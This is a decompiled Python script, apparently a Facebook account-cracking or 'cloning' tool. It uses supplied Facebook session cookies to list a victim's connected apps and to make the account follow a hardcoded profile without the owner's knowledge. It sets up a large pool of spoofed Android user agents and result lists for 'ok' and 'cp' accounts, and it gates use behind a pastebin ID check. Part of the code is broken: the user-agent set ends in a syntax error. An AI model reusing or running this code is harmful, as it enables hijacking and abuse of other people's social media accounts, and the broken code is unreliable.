# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-05-15 10:54:19.688328
def cek_apk(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://m.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as mohsinali
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"Mozilla/5.0 (Linux; Android 4.3; fr-fr; SAMSUNG GT-I9300I Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.3.1; uk-ua; GT-I9300 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 CyanogenMod/10.2.0/i9300",
"Mozilla/5.0 (Linux; U; Android 4.3; pl-pl; SAMSUNG GT-I9300/I9300XXUGNA5 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile ",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-ph; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",    
"Mozilla/5.0 (Linux; U; Android 4.1.2; fr-fr; SAMSUNG GT-I9300/I9300XXEMC2 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", 
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/16.7.0.10",
"Mozilla/5.0 (Linux; U; Android 4.4.4; GT-I9300I Build/KTU84P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 OPR/60.0.2254.59405",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 OkApp",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 trill_210101 JsSdk/1.0 NetType/WIFI Channel/googleplay AppName/musically_go app_version/21.1.1 ByteLocale/ru-RU ByteFullLocale/ru-RU Region/RU",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-RU; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.6.900 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 54.0.0.14.82 Android (16/4.1.2; 320dpi; 720x1280; samsung; GT-I9300; m0; smdk4x12; ru_RU; 117539698)",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/11.7.0.5",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/15.6.5.1",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/14.2.0.26",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YaBrowser/21.1.0.188 (lite)",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 YaBrowser/21.1.0.188 (lite) Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 YaBrowser/21.1.0.188 (lite) Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 YandexSearch/6.45",
"Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/2.1.12.516912",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 PHX/4.1",
"Mozilla/5.0 (Linux; U; Android 4.3; tr-TR; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.6.900 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.3; SPH-L710 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36",       
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 trill_2022009030 JsSdk/1.0 NetType/3G Channel/googleplay AppName/musical_ly app_version/20.9.3 ByteLocale/ru-RU ByteFullLocale/ru-RU Region/KG BytedanceWebview/d8a21c6",
"Mozilla/5.0 (Linux; Android 4.3.1; GT-I9300 Build/JLS36I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
"Mozilla/5.0 (Linux; U; Android 4.2.2; vi-vn; GT-I9300 Build/JDQ39E) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",    
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 trill_2022103040 JsSdk/1.0 NetType/WIFI Channel/googleplay AppName/musical_ly app_version/21.3.4 ByteLocale/ru-RU ByteFullLocale/ru-RU Region/UZ BytedanceWebview/d8a21c6",
"Mozilla/5.0 (Linux; U; Android 4.3; ro-ro; GT-I9300-ORANGE/I9300XXUGPE1 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/15.9.0.5",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 trill_2022006040 JsSdk/1.0 NetType/3G Channel/googleplay AppName/musical_ly app_version/20.6.4 ByteLocale/ru-RU ByteFullLocale/ru-RU Region/KG BytedanceWebview/d8a21c6",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 trill_2022008040 JsSdk/1.0 NetType/3G Channel/googleplay AppName/musical_ly app_version/20.8.4 ByteLocale/ru-RU ByteFullLocale/ru-RU Region/KG BytedanceWebview/d8a21c6",
"Mozilla/5.0 (Linux; U; Android 4.3; uz-uz; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/2.8.8.849369.arm",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 trill_2021903040 JsSdk/1.0 NetType/3G Channel/googleplay AppName/musical_ly app_version/19.3.4 ByteLocale/ru-RU ByteFullLocale/ru-RU Region/KZ BytedanceWebview/d8a21c6",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 trill_2021908030 JsSdk/1.0 NetType/3G Channel/googleplay AppName/musical_ly app_version/19.8.3 ByteLocale/ru-RU ByteFullLocale/ru-RU Region/KG BytedanceWebview/d8a21c6",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/15.8.0.6",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 trill_2021903040 JsSdk/1.0 NetType/3G Channel/googleplay AppName/musical_ly app_version/19.3.4 ByteLocale/ru-RU ByteFullLocale/ru-RU Region/KG BytedanceWebview/d8a21c6",
"Mozilla/5.0 (Linux; U; Android 4.1.1; es-US; GT-I9300 Build/JRO03L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.3; en-GB; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36",      
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/15.4.0.1",
"Mozilla/5.0 (Linux; U; Android 4.3; en-US; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FBAN/EMA;FBLC/ru_RU;FBAV/215.0.0.9.119;FBDM/DisplayMetrics{density=2.0, width=720, height=1280, scaledDensity=2.0, xdpi=304.8, ydpi=306.716};]",        
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/15.3.0.2",
"Mozilla/5.0 (Linux; U; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Chrome/ Mobile Safari/534.30 OPR/55.1.2254.56965",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 54.0.0.14.82 Android (18/4.3; 320dpi; 720x1280; samsung; GT-I9300; m0; smdk4x12; ru_RU; 117539698)",
"Mozilla/5.0 (Linux; Android 4.4.2; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-RU; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.1.1; GT-I9300 Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 OPR/46.1.2254.55193",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
"Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YaBrowser/19.6.0.179 (lite)",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/5.9.33.16.arm",
"Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FBAN/EMA;FBLC/ru_RU;FBAV/215.0.0.9.119;FBDM/DisplayMetrics{density=2.0, width=720, height=1280, scaledDensity=2.0, xdpi=304.8, ydpi=306.71698};]",    
"Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36",        
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/14.5.0.7",
"Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
"Mozilla/5.0 (Linux; U; Android 4.3; pl-pl; GT-I9300-ORANGE/I9300XXUGNB5 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.3; fa-ir; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",      
"Mozilla/5.0 (Linux; U; Android 4.3; en-gb; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/6.16.33.16.arm",
"Mozilla/5.0 (Linux; U; Android 4.3; en-US; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.8.8.1140 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; GT-I9300 Build/JDQ39E; CyanogenMod-10.1) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Mobile Safari/537.36",     
"Mozilla/5.0 (Linux; U; Android 4.3; ru-gb; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",      
"Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 YaBrowser/15.12.2.6773.00 Yowser/2.5.3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Mobile Safari/537.36 OPR/30.0.1856.93524",
"Mozilla/5.0 (Linux; Android 4.3.1; GT-I9300 Build/JLS36I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",      
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36 OPR/41.1.2246.111645",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Mobile Safari/537.36 OPR/16.0.1212.63780",
"Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.5 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300I Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 YandexSearch/5.23",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300 Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36",      
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36",     
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.72 Mobile Safari/537.36 OPR/19.0.1340.69721",
"Mozilla/5.0 (Linux; U; Android 4.4.4; GT-I9300I Build/KTU84P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 OPR/37.1.2254.132401",
"Mozilla/5.0 (Linux; U; Android 4.3; en-US; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36",     
"Mozilla/5.0 (Linux; Android 4.1.1; GT-I9300 Build/JRO03C) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.58 Mobile Safari/537.31",      
"Mozilla/5.0 (Linux; U; Android 4.3; en-US; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.5.2.582 U3/0.8.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.4.4; GT-I9300 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Mobile Safari/537.36 OPR/37.0.2192.105088",
"Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 OPR/48.1.2331.132804",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/7.14.21.16.arm",
"Mozilla/5.0 (Linux; U; Android 4.3; de-de; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30,gzip(gfe)",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9300I Build/JLS36C) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16",     
"Mozilla/5.0 (Linux; Android 4.3; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",        
"Mozilla/5.0 (Linux; U; Android 4.3; GT-I9300I Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 OPR/35.0.2254.127755",
"Mozilla/5.0 (Linux; U; Android 4.3; en-US; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.1.0.527 U3/0.8.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.3; en-US; GT-I9300 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.2.5.1102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.0.4; GT-I9300 Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",     
"Mozilla/5.0 (Linux; U; Android 4.4.4; en-US; GT-I9300 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.2.0.915 U3/0.8.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.3.1; ru-ru; GT-I9300 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",    
"Mozilla/5.0 (Linux; U; Android 4.3; ru; GT-I9300 Build/JSS15J) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/9.7.5.418 U3/0.8.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 4.3; en-US; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.1.5.890 U3/0.8.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.3; en-US; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.8.820 U3/0.8.0 Mobile Safari/534.30",.
}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def sasuke():
    import os
    try:
        import requests
    except ImportError:
        os.system('pip install requests')
    import os, requests
    
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "<>".join(uuid)
    print("\n\n\x1b[37;1m  YOUR ID : \033[94m"+id)
    try:
        url = requests.get("https://pastebin.com/raw/L0f50dUQ").text
    except requests.exceptions.ConnectionError:
        print('No Internet Connection')
    if id in url:
        print("\033[92m  YOUR ID IS ACTIVE.........\033[97m")
    elif id not in url:
        print('\033[0;91mYour Id Not Activate Send Chat To @KakTarani')
        exit()
      
sasuke()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo="""      
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⠶⠶⠖⠚⠛⠛⠛⠛⠒⠶⠶⣶⣶⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⡾⠟⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⣿⠋⠀⠀⠀⠀⢀⣠⣴⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠴⣒⡽⠟⣩⠏⢩⠉⢏⠙⠯⣑⠲⠦⣄⡀⠀⠀⠀⠀⠀⠀⠙⢶⣤⡀⠀⠀⠀⠀⠈⢿⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⡟⠁⠀⠀⣠⢄⣶⣿⠟⠁⠀⠀⠀⠀⢀⣴⠞⠋⠀⣠⠞⠁⠀⣰⠋⠀⣼⠀⠀⢧⡀⠈⠙⢦⡀⠉⠓⠦⣀⡀⠀⠀⠀⠀⠹⣿⣷⣤⢤⡀⠀⠀⠹⣷⡀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⠟⠀⠀⣴⡟⢠⣿⡿⢋⡄⠀⠀⠀⣠⠞⠃⠤⢄⣀⠞⠁⠀⠀⢰⡏⠀⠀⠿⠀⠀⠘⣧⠀⠀⠀⠙⣆⣀⠤⠄⠛⢦⡀⠀⠀⠐⡜⢿⣿⣆⢻⣦⡀⠀⠘⣿⡄⠀⠀⠀
⠀⠀⢀⣾⠏⠀⡠⣸⣿⠇⡾⢋⣴⡟⠀⠀⢠⠞⠃⠀⠀⠀⢠⠟⠙⠒⠒⠤⡞⠀⣤⣤⠶⣤⣤⡀⠘⠀⠐⠒⠊⠙⣧⠀⠀⠀⠀⠙⣄⠀⠀⠹⣶⣝⠻⡄⣿⣷⢠⡀⠘⣿⡄⠀⠀
